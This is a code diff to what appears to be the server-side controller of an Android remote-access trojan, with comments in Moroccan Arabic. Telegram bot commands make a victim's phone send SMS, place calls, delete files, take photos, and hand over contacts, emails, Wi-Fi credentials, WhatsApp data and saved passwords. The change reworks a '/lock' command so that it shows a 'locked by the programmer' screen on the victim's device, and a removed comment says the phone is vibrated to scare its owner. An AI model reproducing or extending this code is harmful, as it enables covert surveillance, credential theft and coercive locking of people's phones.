@@ -10,15 +10,23 @@ for (let i = 1; i <= 100; i++) COMMAND_MAP[`/toast${i}`] = `toast:إشعار ${i
 for (let i = 1; i <= 100; i++) COMMAND_MAP[`/url${i}`] = `url:https://example.com/p${i}`;
 for (let i = 1; i <= 100; i++) COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`;
 for (let i = 1; i <= 100; i++) COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص ${i}`;
-for (let i = 1; i <= 50; i++) COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسالة ${i}`;
-for (let i = 1; i <= 50; i++) COMMAND_MAP[`/call${i}`] = `call:+1234567890`;
+for (let i = 1; i <= 50; i++) COMMAND_MAP[`/sms${i}`] = `sms:+212600000000|رسالة ${i}`;
+for (let i = 1; i <= 50; i++) COMMAND_MAP[`/call${i}`] = `call:+212600000000`;
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/openapp${i}`] = `open_app:com.android.chrome`;
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/del${i}`] = `delete:file${i}.txt`;
 
 const BASE_COMMANDS = {
-  '/fullinfo': 'fullinfo:1', '/applist': 'applist:1', '/files': 'files:1', '/killapp': 'killapp:1',
-  '/sysinfo': 'sysinfo:1', '/photo': 'take_photo', '/contacts': 'get_contacts:1',
-  '/root_wifi': 'root_wifi:1', '/root_wa': 'root_whatsapp:1', '/root_pass': 'root_accounts:1', '/emails': 'get_emails:1'
+  '/fullinfo': 'fullinfo:1', 
+  '/applist': 'applist:1', 
+  '/files': 'files:1',
+  '/killapp': 'killapp:1', 
+  '/sysinfo': 'sysinfo:1', 
+  '/photo': 'take_photo',
+  '/contacts': 'get_contacts:1', 
+  '/root_wifi': 'root_wifi:1',
+  '/root_wa': 'root_whatsapp:1', 
+  '/root_pass': 'root_accounts:1',
+  '/emails': 'get_emails:1'
 };
 
 async function kvCmd(...args) {
@@ -67,7 +75,6 @@ export default async function handler(req, res) {
     if (type === 'secret') return res.status(200).send(`"${(await kvCmd('GET', 'app_lock_status')) || 'unlock'}"`);
     if (type === 'key') return res.status(200).send(`"${(await kvCmd('GET', 'app_secret_key')) || '1234'}"`);
     
-    // هنا كنجيبو الرسالة المخصصة اللي كتبتيها، إلا ماكانتش كيرجع الرسالة الافتراضية
     if (type === 'message') {
       const customMsg = await kvCmd('GET', 'app_lock_msg');
       return res.status(200).send(`"${customMsg || '🚨 الهاتف مقفول من طرف المبرمج 🚨'}"`);
@@ -176,14 +183,15 @@ export default async function handler(req, res) {
 
         case '/lock': 
           await kvCmd('SET', 'app_lock_status', 'lock'); 
-          // كنخليو الهاتف يهز 10 ثواني بقوة باش يخاف
-          remoteCommand = `vibrate_time:10000`;
-          await sendToTelegram("🔒 [LOCK] تم قفل الهاتف وإرسال الهزة القوية!"); 
+          const msgLock = (await kvCmd('GET', 'app_lock_msg')) || '🚨 الهاتف مقفول من طرف المبرمج 🚨';
+          // كنصيفطو الأمر ديال الشاشة مباشرة مع الهزة
+          remoteCommand = `show_lock:${msgLock}`;
+          await sendToTelegram("🔒 [LOCK] تم إرسال أمر القفل للهاتف!"); 
           break;
 
         case '/unlock': 
           await kvCmd('SET', 'app_lock_status', 'unlock'); 
-          remoteCommand = `killapp:1`; // باش يتقفل التطبيق ويفك القفل
+          remoteCommand = `killapp:1`; 
           await sendToTelegram("🔓 [UNLOCK] تم فك القفل."); 
           break;
 
